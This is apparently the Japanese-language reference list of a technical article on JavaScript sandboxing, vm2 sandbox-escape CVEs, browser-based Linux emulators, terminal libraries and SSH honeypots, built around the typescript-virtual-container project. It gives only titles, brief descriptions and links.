- **`vm2`**。npm：[npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub：[github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVE年表**。全CVEと日付のFortiGuard警告：[fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017**。非同期エラー脱出、GHSA：[github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314**。ProxyとError.nameとFunction脱出、PoC gist：[gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466**。完全PoC付きExploit DB entry：[exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **2026年vm2 CVE**。11の新脱出、分析：[thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer：[bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"**。CVE-2022-36067のoxeye.io事後分析：[oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`**。npm：[npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub：[github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate内部**。組み込み指南：[v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`**。npm：[npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub：[github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`**。npm：[npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub：[github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJSエンジン**。Fabrice Bellard作：[bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno権限モデル**。文書：[docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2発売**。2024年10月：[deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealm提案**。[github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartments提案**。[github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"**。Denoサンドボックス手法のAndrew Healey実践記事：[healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linuxエミュレータ

- **`v86`**。npm：[npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub：[github.com/copy/v86](https://github.com/copy/v86) · デモ：[copy.sh/v86](https://copy.sh/v86)
- **v86 OS対応表**。[github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS**（v86使用BIOS）。[seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE拡張**（VGA参照）。[bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux**。Bellardエミュレータ：[bellard.org/jslinux](https://bellard.org/jslinux/) · 技術 note（TinyEMU、歴史、asm.jsからWasm）：[bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU**。Cソース：[bellard.org/tinyemu](https://bellard.org/tinyemu/) · 非公式GitHub鏡：[github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k**。JS製OpenRISCエミュレータ：[github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · デモ：[s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX**。文書：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads指南：[cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers**。npm：[npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API文書：[webcontainers.io](https://webcontainers.io) · 告知：[blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ概要：[infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm**。GitHub：[github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTTブログ記事：[medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison記事：[simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### 端末 stack

- **xterm.js**。npm：[npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub：[github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · サイト：[xtermjs.org](https://xtermjs.org)
- **node-pty**。npm：[npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft)：[github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### ハニーポット

- **Cowrie**。GitHub：[github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · 文書：[docs.cowrie.org](https://docs.cowrie.org) · サイト：[cowrie.org](https://www.cowrie.org/)
- **Kippo**。GitHub（保存）：[github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh**。GitHub：[github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame**。GitHub：[github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird**。Docker Hub：[hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot**。最小Node.js SSHハニーポット：[github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots**。整理一覧：[github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082**。 system 情報発見（攻撃者がハニーポットをどう見分けるか）：[attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**：[npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**：[github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **オンライン demo**：[itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **建築指南**：[github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (SSH protocol 実装）。npm：[npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub：[github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (VFS snapshot 圧縮）。npm：[npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (WebSocket shell 転送）。npm：[npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### 関連読み物

- **POSIX権限モデル**。Open Group仕様：[pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (VFS永続に使う模様）。[en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolateモデル**。「Embedder's Guide」：[v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V ISA仕様**（TinyEMUやJSLinux文脈用）。[riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000建築**。[opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"**。Simon Willison TIL、Wasm手法との有用対比：[til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"**。Simon Willison TIL、quickjs-emscripten bundle サイズについて：[til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)

